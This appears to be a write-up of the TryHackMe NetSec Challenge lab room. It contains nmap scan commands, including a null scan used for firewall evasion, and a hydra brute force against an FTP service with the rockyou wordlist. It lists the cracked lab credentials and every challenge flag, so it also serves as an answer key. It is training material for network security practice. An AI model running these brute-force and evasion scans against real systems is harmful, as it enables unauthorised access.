# TryHackMe NetSec Challenge

URL: https://tryhackme.com/room/netsecchallenge

Description: Use this challenge to test your mastery of the skills you have acquired in the Network Security module. All the questions in this challenge can  be solved using only nmap, telnet, and hydra. 

Tags: Credential-brute-force, FTP, Firewall-evasion, Hydra

# TLDR: Attack chain

```bash
# Setup
export ip={target-ip}
ping $ip
# Scanning
sudo nmap -sS -p- $ip -T5 -v
sudo nmap -sS -Pn -p- $ip -T4 --min-rate=9001 -v
nmap -A -p 22,80,139,445,8080,10021 $ip
# Challenge in FTP
echo "eddie\nquinn\n" >> users.txt
hydra -t 16 -L users.txt -P /usr/share/wordlists/rockyou.txt $ip ftp -s 10021 -vV
ftp ftp://quinn:andrea@$ip:10021/
ls
get ftp_flag.txt
quit
cat ftp_flag.txt
# Challenge in port 8080
firefox http://$ip:8080
sudo nmap -sN -Pn $ip -v
```

## Creds found:

| Service | Username | Password |
| --- | --- | --- |
| FTP | quinn | andrea |
| FTP | eddie | jordan |

# Setup and Scanning

![Untitled](NetSec%20Challenge/Untitled.png)

![Untitled](NetSec%20Challenge/Untitled%201.png)

![Untitled](NetSec%20Challenge/Untitled%202.png)

---

# TryHackMe Basic Questions

Most are found through nmap scans 

## 1. What is the highest port number being open less than 10,000?

**Answer:** 8080 

## 2. There is an open port outside the common 1000 ports; it is above 10,000. What is it?

![Untitled](NetSec%20Challenge/Untitled%203.png)

**Answer:** 10021

## 3. How many TCP ports are open

**Answer:** 6

Server Header Flags 

![Untitled](NetSec%20Challenge/Untitled%204.png)

## 4. What is the flag hidden in the HTTP server header?

**Answer:**  THM{web_server_25352}

## 5. What is the flag hidden in the SSH server header?

**Answer:** THM{946219583339}

# TryHackMe FTP Challenge

## 6. We have an FTP server listening on a nonstandard port. What is the version of the FTP server?

**Answer:** vsftpd 3.0.3

## 7. We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?

Trying default password does not work

### Using Hydra

```jsx
hydra -t 16 -L users.txt -P /usr/share/wordlists/rockyou.txt $ip ftp -s 10021 -vV -I
```

![Untitled](NetSec%20Challenge/Untitled%205.png)

![Untitled](NetSec%20Challenge/Untitled%206.png)

![Untitled](NetSec%20Challenge/Untitled%207.png)

### Credentials found:

- quinn:andrea
- eddie:jordan

### ftp flag

no files found in eddie’s account

![Untitled](NetSec%20Challenge/Untitled%208.png)

flag found in quinn’s account

![Untitled](NetSec%20Challenge/Untitled%209.png)

Getting the flag `get ftp_flag.txt`

**Answer:** THM{321452667098}

# TryHackMe Port 8080 Challenge

## 8. Browsing to `http://$ip:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?

![Untitled](NetSec%20Challenge/Untitled%2010.png)

Use null scan - `sudo nmap -sN -Pn $ip-v`

Exercise Complete! Task **Answer:** THM{f7443f99}